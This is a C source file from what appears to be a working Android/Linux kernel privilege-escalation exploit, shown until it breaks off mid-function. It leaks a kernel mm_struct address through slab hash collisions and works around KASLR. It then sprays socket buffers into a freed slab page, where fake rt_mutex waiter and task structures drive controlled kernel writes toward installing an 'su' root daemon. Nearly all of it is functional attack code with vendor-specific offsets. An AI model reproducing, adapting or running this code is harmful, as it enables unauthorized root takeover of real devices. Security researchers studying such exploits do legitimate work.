#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include "perf_reclaim_gate.h"
#include "reclaim_hold.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static struct ghostlock_reclaim_batch reclaim_batch;
static struct ghostlock_reclaim_batch buddy_guard_batch;
static struct ghostlock_reclaim_batch absorb_batch;
static struct ghostlock_reclaim_batch shaping_batch;
static int reclaim_sockets_initialized;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static size_t prepare_slab_count;
static size_t spray_slab_count;
static int reclaim_trace_fd = -1;
static int reclaim_trace_marker_fd = -1;
static int reclaim_trace_enabled;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_custom_shape;
int direct_root_cpu = -1;

/* Runtime linear-map alias correction; see common.h.  Default: compile-time
 * nominal alias (delta 0), Spec A survive-anywhere stamp. */
uint64_t p0_linear_delta;
int p0_slide_leak;

int p0_env_init(void) {
  const char *delta = getenv("AI_PIN_LINEAR_SLIDE");
  if (delta && *delta) {
    errno = 0;
    char *end = NULL;
    unsigned long long value = strtoull(delta, &end, 0);
    if (errno || end == delta || (end && *end)) {
      pr_error("AI_PIN_LINEAR_SLIDE parse failed: %s\n", delta);
      return 0;
    }
    p0_linear_delta = (uint64_t)value;
  }
  const char *leak = getenv("AI_PIN_SLIDE_LEAK");
  p0_slide_leak = 0;
  if (leak && strcmp(leak, "1") == 0) {
    p0_slide_leak = 1;
  } else if (leak && strcmp(leak, "2") == 0) {
    p0_slide_leak = 2;
  }
  pr_success("slide alias state delta=%016llx leak=%d loggers=%016zx "
             "bootid_slot=%016zx\n",
             (unsigned long long)p0_linear_delta, p0_slide_leak,
             (uintptr_t)SLIDE_LOGGERS_0_1,
             (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA);
  return 1;
}

uintptr_t p0_runtime_alias(uintptr_t image_addr) {
  return (uintptr_t)P0_PAGE_OFFSET + (uintptr_t)p0_linear_delta +
         (image_addr - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA);
}

static int write_trace_control(char value) {
  if (reclaim_trace_fd < 0) {
    return 1;
  }
  if (lseek(reclaim_trace_fd, 0, SEEK_SET) < 0) {
    return 0;
  }
  for (;;) {
    ssize_t n = write(reclaim_trace_fd, &value, 1);
    if (n == 1) {
      reclaim_trace_enabled = value == '1';
      return 1;
    }
    if (n < 0 && errno == EINTR) {
      continue;
    }
    return 0;
  }
}

static int write_reclaim_trace_marker(const char *marker) {
  if (reclaim_trace_marker_fd < 0) {
    return 1;
  }
  size_t length = strlen(marker);
  size_t offset = 0;
  while (offset < length) {
    ssize_t n = write(reclaim_trace_marker_fd, marker + offset,
                      length - offset);
    if (n > 0) {
      offset += (size_t)n;
    } else if (n < 0 && errno == EINTR) {
      continue;
    } else {
      return 0;
    }
  }
  return 1;
}

int prepare_reclaim_trace_init(void) {
  const char *requested = getenv("AI_PIN_PREPARE_TRACE");
  if (!requested || strcmp(requested, "1") != 0) {
    return 1;
  }
  /*
   * The host enables individual tracepoints while adbd is root.  On the DEV
   * build tracing_on and trace_marker are intentionally writable by the
   * readtracefs shell group, so the unprivileged exploit can bound its own
   * same-attempt capture window.  The opens below remain the authority gate.
   */
  reclaim_trace_fd = open("/sys/kernel/tracing/tracing_on",
                          O_WRONLY | O_CLOEXEC);
  if (reclaim_trace_fd < 0) {
    return 0;
  }
  reclaim_trace_marker_fd = open("/sys/kernel/tracing/trace_marker",
                                 O_WRONLY | O_CLOEXEC);
  if (reclaim_trace_marker_fd < 0) {
    int saved_errno = errno;
    close(reclaim_trace_fd);
    reclaim_trace_fd = -1;
    errno = saved_errno;
    return 0;
  }
  if (!write_trace_control('0')) {
    int saved_errno = errno;
    close(reclaim_trace_marker_fd);
    reclaim_trace_marker_fd = -1;
    close(reclaim_trace_fd);
    reclaim_trace_fd = -1;
    errno = saved_errno;
    return 0;
  }
  pr_success("reclaim trace control armed fd=%d uid=%u\n",
             reclaim_trace_fd, getuid());
  return 1;
}

void prepare_reclaim_trace_close(void) {
  if (reclaim_trace_fd < 0) {
    return;
  }
  if (reclaim_trace_enabled) {
    (void)write_trace_control('0');
  }
  if (reclaim_trace_marker_fd >= 0) {
    close(reclaim_trace_marker_fd);
    reclaim_trace_marker_fd = -1;
  }
  close(reclaim_trace_fd);
  reclaim_trace_fd = -1;
  reclaim_trace_enabled = 0;
}

static cpu_set_t initial_affinity;
static int initial_affinity_valid;

static int read_sysfs_u64(const char *path, uint64_t *out) {
  char buf[64];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  buf[n] = 0;

  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(buf, &end, 10);
  if (errno || end == buf) {
    return 0;
  }
  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
    end++;
  }
  if (*end) {
    return 0;
  }
  *out = (uint64_t)value;
  return 1;
}

static int read_env_u64(const char *name, uint64_t *out) {
  const char *text = getenv(name);
  if (!text || !*text) {
    errno = ENOENT;
    return 0;
  }
  char *end = NULL;
  errno = 0;
  unsigned long long value = strtoull(text, &end, 10);
  if (errno || end == text || *end) {
    errno = EINVAL;
    return 0;
  }
  *out = (uint64_t)value;
  return 1;
}

int init_direct_root_cpu(void) {
  if (sched_getaffinity(0, sizeof(initial_affinity), &initial_affinity) != 0) {
    return 0;
  }
  initial_affinity_valid = 1;

  long configured = sysconf(_SC_NPROCESSORS_CONF);
  if (configured <= 0 || configured > CPU_SETSIZE) {
    configured = CPU_SETSIZE;
  }

  int best = -1;
  int fallback = -1;
  uint64_t best_freq = 0;
  uint64_t best_capacity = 0;
  for (int cpu = 0; cpu < configured; cpu++) {
    if (!CPU_ISSET(cpu, &initial_affinity)) {
      continue;
    }

    char path[160];
    uint64_t online = 1;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/online", cpu);
    if (read_sysfs_u64(path, &online) && online != 1) {
      continue;
    }
    fallback = cpu;

    uint64_t freq = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
    if (!read_sysfs_u64(path, &freq)) {
      snprintf(path, sizeof(path),
               "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
      if (!read_sysfs_u64(path, &freq)) {
        continue;
      }
    }

    uint64_t capacity = 0;
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
    (void)read_sysfs_u64(path, &capacity);

    if (best < 0 || freq > best_freq ||
        (freq == best_freq && capacity > best_capacity) ||
        (freq == best_freq && capacity == best_capacity && cpu > best)) {
      best = cpu;
      best_freq = freq;
      best_capacity = capacity;
    }
  }

  if (best < 0) {
    int current = sched_getcpu();
    if (current >= 0 && current < CPU_SETSIZE &&
        CPU_ISSET(current, &initial_affinity)) {
      best = current;
    } else {
      best = fallback;
    }
    if (best >= 0) {
      pr_warning("CPU max frequency unavailable; fallback cpu=%d\n", best);
    }
  }
  if (best < 0) {
    errno = ENODEV;
    return 0;
  }

  direct_root_cpu = best;
  pr_success("runtime performance cpu=%d max_freq=%llu capacity=%llu\n",
             best, (unsigned long long)best_freq,
             (unsigned long long)best_capacity);
  return 1;
}

int restore_initial_affinity(void) {
  if (!initial_affinity_valid) {
    errno = EINVAL;
    return 0;
  }
  return sched_setaffinity(
      0, sizeof(initial_affinity), &initial_affinity) == 0;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("startup pid=%d uid=%u attr=%s enforce=%s direct_cpu=%d\n",
             getpid(), getuid(), attr, enforce, direct_root_cpu);
}

void log_slide_child_context(void) {
  pr_success("slide child pid=%d uid=%u direct_cpu=%d\n",
             getpid(), getuid(), direct_root_cpu);
}

void disable_rseq_for_thread(void) {
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}

uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}

int pselect_write_shape(void) {
  return pselect_custom_shape;
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_shape = shape;
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

static pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    pin_to_core((size_t)direct_root_cpu);
    kernelsnitch_find_collisions(ks);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY | O_CLOEXEC));
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

static void init_reclaim_socket_tables(void) {
  if (reclaim_sockets_initialized) {
    return;
  }
  ghostlock_reclaim_batch_init(&reclaim_batch);
  ghostlock_reclaim_batch_init(&buddy_guard_batch);
  ghostlock_reclaim_batch_init(&absorb_batch);
  ghostlock_reclaim_batch_init(&shaping_batch);
  reclaim_sockets_initialized = 1;
}

static void close_transient_reclaim_sockets(void) {
  init_reclaim_socket_tables();
  ghostlock_reclaim_batch_close(&shaping_batch);
  ghostlock_reclaim_batch_close(&absorb_batch);
  ghostlock_reclaim_batch_close(&buddy_guard_batch);
}

void close_reclaim_sockets(void) {
  init_reclaim_socket_tables();
  close_transient_reclaim_sockets();
  ghostlock_reclaim_batch_close(&reclaim_batch);
}

/*
 * Socket creation allocates kernel objects from caches that can alias the
 * retail :A-0000896 cache.  Open every socket used by the reclaim sequence
 * before allocating any shaping mm_structs, so no socket setup can occupy a
 * slot in the target slab or perturb the critical release-to-send window.
 */
static int open_reclaim_sockets_early(void) {
  init_reclaim_socket_tables();
  size_t reclaim_pairs = ghostlock_perf_gate_enabled() ?
      SKB_PERF_GATE_RECLAIM_PAIRS : GHOSTLOCK_RECLAIM_PAIRS;
  if (ghostlock_reclaim_batch_open(
          &reclaim_batch, reclaim_pairs,
          GHOSTLOCK_RECLAIM_SNDBUF) != 0 ||
      ghostlock_reclaim_batch_open(
          &buddy_guard_batch, GHOSTLOCK_BUDDY_GUARD_PAIRS,
          GHOSTLOCK_RECLAIM_SNDBUF) != 0 ||
      ghostlock_reclaim_batch_open(
          &absorb_batch, SKB_ABSORB_PAIRS,
          GHOSTLOCK_RECLAIM_SNDBUF) != 0 ||
      ghostlock_reclaim_batch_open(
          &shaping_batch, 1, GHOSTLOCK_RECLAIM_SNDBUF) != 0) {
    int saved_errno = errno ? errno : EIO;
    close_reclaim_sockets();
    errno = saved_errno;
    return 0;
  }
  return 1;
}

/*
 * Leave ordinary order-0 pages available while the emptied mm slab is
 * discarded.  Otherwise an unrelated PCP refill can split the fresh order-3
 * page before the skb spray reaches it.  This runs before the late partial
 * drain, while the target slab is still frozen and cannot itself be stolen.
 */
static int prefill_order0_buddy(void) {
  size_t len = (size_t)RECLAIM_ORDER0_PREFILL_MB << 20;
  unsigned char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) {
    return 0;
  }
  for (size_t off = 0; off < len; off += PAGE_SIZE) {
    p[off] = 0;
  }
  return munmap(p, len) == 0;
}

/*
 * Temporarily occupy a bounded set of order-3 skb backing pages before the
 * target slab is discarded.  The target spray is separate and remains queued;
 * releasing this pressure after the spray therefore cannot release the page
 * carrying the payload.
 */
static int send_order3_absorb(const void *payload, size_t payload_len) {
  struct ghostlock_reclaim_result result;
  (void)ghostlock_reclaim_hold_all(
      &absorb_batch, payload, payload_len,
      SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR, &result);
  return (int)result.sent;
}

/*
 * A pre_ctx clone can consume an existing partial slab, so no fixed clone is
 * guaranteed to open the order-3 slab that later contains the leaked object.
 * Hold one order-3 skb after every pre_ctx clone.  Whichever clone opens the
 * target slab is then immediately followed by a retained allocation; the host
 * trace gate still requires that one of those allocations is the target's
 * exact order-3 buddy before it credits this guard.
 */
static int send_buddy_guard(const void *payload, size_t payload_len) {
  return ghostlock_reclaim_hold_one(
      &buddy_guard_batch, payload, payload_len);
}

static void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

static void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->memfds);
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

static int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

static void init_ctx(struct mm_ctx *ctx, size_t count) {
  ctx->mm_cnt = count;
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->memfds) {
    pr_error("mm context allocation failed count=%zu\n", count);
  }
  for (size_t i = 0; i < count; i++) {
    ctx->memfds[i] = -1;
  }
}

static int prepare_ctxs(void) {
  uint64_t object_size = 0;
  uint64_t slab_size = 0;
  uint64_t order = 0;
  uint64_t objs_per_slab = 0;
  uint64_t cpu_partial = 0;
  int live_geometry =
      read_sysfs_u64("/sys/kernel/slab/mm_struct/object_size", &object_size) &&
      read_sysfs_u64("/sys/kernel/slab/mm_struct/slab_size", &slab_size) &&
      read_sysfs_u64("/sys/kernel/slab/mm_struct/order", &order) &&
      read_sysfs_u64("/sys/kernel/slab/mm_struct/objs_per_slab",
                     &objs_per_slab) &&
      read_sysfs_u64("/sys/kernel/slab/mm_struct/cpu_partial", &cpu_partial);
  if (!live_geometry &&
      !(read_env_u64("AI_PIN_MM_OBJECT_SIZE", &object_size) &&
        read_env_u64("AI_PIN_MM_SLAB_SIZE", &slab_size) &&
        read_env_u64("AI_PIN_MM_ORDER", &order) &&
        read_env_u64("AI_PIN_MM_OBJS_PER_SLAB", &objs_per_slab) &&
        read_env_u64("AI_PIN_MM_CPU_PARTIAL", &cpu_partial))) {
    pr_warning("mm_struct SLUB metadata unavailable from sysfs and guard env; "
               "refusing reclaim\n");
    return 0;
  }
  if (object_size != MM_STRUCT_OBJECT_SZ || slab_size != MM_STRUCT_SZ ||
      order != MM_ORDER || objs_per_slab != mm_objs_per_slab) {
    pr_warning("mm_struct SLUB geometry mismatch object=%llu slab=%llu "
               "order=%llu objs=%llu expected=%x/%x/%d/%zu\n",
               (unsigned long long)object_size,
               (unsigned long long)slab_size,
               (unsigned long long)order,
               (unsigned long long)objs_per_slab,
               MM_STRUCT_OBJECT_SZ, MM_STRUCT_SZ, MM_ORDER,
               mm_objs_per_slab);
    return 0;
  }

  prepare_slab_count = (size_t)cpu_partial + 2;
  if (prepare_slab_count < MM_PREPARE_SLABS_MIN) {
    prepare_slab_count = MM_PREPARE_SLABS_MIN;
  }
  if (prepare_slab_count > MM_PREPARE_SLABS_MAX) {
    pr_warning("mm_struct cpu_partial=%llu exceeds safe marker cap=%d\n",
               (unsigned long long)cpu_partial, MM_PREPARE_SLABS_MAX);
    return 0;
  }
  spray_slab_count = (size_t)cpu_partial + 1;
  if (spray_slab_count > MM_PREPARE_SLABS_MAX) {
    pr_warning("mm_struct cpu_partial=%llu exceeds safe spray cap=%d\n",
               (unsigned long long)cpu_partial, MM_PREPARE_SLABS_MAX);
    return 0;
  }
  pr_info("mm SLUB geometry source=%s object=%llu slab=%llu order=%llu "
          "objs=%llu cpu_partial=%llu prepare_slabs=%zu spray_slabs=%zu\n",
          live_geometry ? "sysfs" : "guard-env",
          (unsigned long long)object_size,
          (unsigned long long)slab_size,
          (unsigned long long)order,
          (unsigned long long)objs_per_slab,
          (unsigned long long)cpu_partial, prepare_slab_count,
          spray_slab_count);

  init_ctx(&prepare_ctx, prepare_slab_count * mm_objs_per_slab);
  init_ctx(&spray_ctx, spray_slab_count * mm_objs_per_slab);
  init_ctx(&pre_ctx, mm_objs_per_slab - 1);
  init_ctx(&post_ctx, mm_objs_per_slab);
  return 1;
}

static void put_direct_waiter(
    unsigned char *p, uintptr_t parent, uintptr_t right,
    uintptr_t left, uint64_t waiter_task) {
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x00, 1);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 0);
  put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 0);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, parent);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, right);
  put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, left);
  put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
  put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
  put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  if (payload_mode != PAGE_PAYLOAD_SLIDE &&
      payload_mode != PAGE_PAYLOAD_FOPS) {
    return 0;
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;

  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  uint64_t waiter_task;
  uint64_t task_group;
  uint64_t pi_top_task;

  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /*
     * Spec A (p0_slide_leak == 0): every stamped pointer stays inside the
     * reclaimed page or the stack waiter; nothing outside the page is
     * trusted, so the walk cannot fault no matter what the per-boot
     * linear-map slide is.
     * Spec B (p0_slide_leak == 1): tree_entry parent/left become the
     * runtime linear aliases of &loggers[0][1] and &random_table[5].data.
     * The rb-erase one-left-child path then performs
     *   *bootid_slot := loggers_alias          (write #1: .data repoint)
     *   loggers_alias+8 := bootid_slot         (write #2: scratch)
     * and the boot_id read-back yields &nfulnl_logger (a slid pointer).
     * pi_tree_entry stays zero in both specs: the walk ends on
     * lock->owner == NULL before any pi-tree operation can run.
     */
    parent = p0_slide_leak ? SLIDE_LOGGERS_0_1 : 0;
    right = 0;
    left = p0_slide_leak ? SLIDE_RANDOM_BOOT_ID_DATA : 0;
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = 0;
  } else {
    parent = pselect_custom_value;
    right = 0;
    left = pselect_custom_target;
    if (pselect_custom_shape == 1) {
      if (pselect_custom_target < 8) {
        return 0;
      }
      parent = pselect_custom_target - 8;
      right = pselect_custom_value;
      left = 0;
    }
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /*
       * The vendor rt_mutex_adjust_prio_chain dereferences
       * lock->waiters.rb_leftmost->lock under a brk-guard before it
       * erases the stamped waiter (vmlinux 0xffffff800814dd54), and
       * again in the wake branch (0xffffff800814e238).  An empty
       * waiters tree therefore faults at address 0x38.  Seed both the
       * rb root and rb_leftmost with fake_w0: fake_w0->lock is
       * fake_lock and fake_w0->prio (130) sorts before the stamped
       * waiter's 139, so the guard passes and the subsequent enqueue
       * inserts as the root without touching any off-page node.
       * owner stays NULL so the walk terminates after iteration 1 via
       * the wake_up_process(top_waiter->task) branch.
       */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_direct_waiter(p, parent, right, left, waiter_task);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
#if TARGET_HAS_UCLAMP
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF,
          FAKE_UCLAMP_MIN_ACTIVE);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 4,
          FAKE_UCLAMP_MAX_ACTIVE);
#endif
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    /*
     * geometry-spec.md: the sched_setattr adjust_pi flavor never reads
     * the fake task's pi_waiters (orig_waiter=NULL skips that block),
     * and a leftmost pointing at the fake waiter would fault if the
     * walk ever followed it.  Zero both words in every mode.
     */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
  }
  return 1;
}

static uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  if (ghostlock_perf_gate_enabled() &&
      !ghostlock_perf_gate_prepare_attempt()) {
    pr_warning("perf reclaim gate attempt setup failed errno=%d\n", errno);
    return 0;
  }
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  if (!open_reclaim_sockets_early()) {
    pr_warning("STAGE-A early reclaim socket setup failed errno=%d\n", errno);
    return 0;
  }
  if (!prepare_ctxs()) {
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_error("skb payload allocation failed\n");
  }
  memset(skb_buf, 0, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.memfds[i] = clone_memfd();
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);

  char trace_note[192];
  int buddy_guard_trace_ok = write_trace_control('1');
  if (!write_reclaim_trace_marker("ghostlock buddy-guard-begin")) {
    buddy_guard_trace_ok = 0;
  }
  int buddy_guard_sent = 0;
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = clone_memfd();
    if (send_buddy_guard(skb_buf, SKB_RECLAIM_SIZE)) {
      buddy_guard_sent++;
    } else {
      break;
    }
  }
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock buddy-guard-end sent=%d requested=%zu",
           buddy_guard_sent, pre_ctx.mm_cnt);
  if (!write_reclaim_trace_marker(trace_note) || !write_trace_control('0')) {
    buddy_guard_trace_ok = 0;
  }
  if (buddy_guard_sent != (int)pre_ctx.mm_cnt ||
      !buddy_guard_trace_ok) {
    pr_warning("STAGE-A buddy guard failed sent=%d/%zu trace=%d "
               "errno=%d\n",
               buddy_guard_sent, pre_ctx.mm_cnt, buddy_guard_trace_ok, errno);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("STAGE-A collisions failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  pr_warning("STAGE-B leaked=%llx\n", (unsigned long long)leaked);
  if (leaked == (uintptr_t)-1) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (size_t)((leaked - base) / MM_STRUCT_SZ));
  /*
   * The 5-way hash correlation (6 collision addresses) makes a false mm
   * vanishingly unlikely, so only sanity-check the page frame.  The old
   * SLUB slot check (offset % 0x380 == 0) assumed the mm_cachep stride;
   * on this build the cache is merged (sysfs shows no mm_struct entry)
   * and empirically the true mm is NOT 0x380-aligned, which made the
   * check reject the genuine leak forever.
   */
  size_t leaked_slot = (size_t)((leaked - base) / 8);
  (void)leaked_slot;
  if (base == 0 || (leaked - base) % 8 != 0 ||
      !prepare_skb_payload(base, payload_mode)) {
    pr_warning("STAGE-C slot math failed off=%zu\n", (size_t)(leaked - base));
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  if (ghostlock_perf_gate_enabled() &&
      !ghostlock_perf_gate_configure(base)) {
    pr_warning("STAGE-C perf reclaim gate configuration failed "
               "base=%016zx errno=%d\n",
               base, errno);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  if (ghostlock_perf_gate_enabled()) {
    const struct ghostlock_perf_gate_result *perf_gate =
        ghostlock_perf_gate_result();
    pr_info("perf reclaim gate configured base=%016zx candidates=%zu\n",
            base, perf_gate->candidate_count);
  }

  if (!ghostlock_reclaim_hold_one(
          &shaping_batch, skb_buf, SKB_RECLAIM_SIZE)) {
    pr_warning("STAGE-D shaping sendmsg failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close_ctx_memfds(&pre_ctx);
  for (size_t i = 0; i + 1 < post_ctx.mm_cnt; i++) {
    close(post_ctx.memfds[i]);
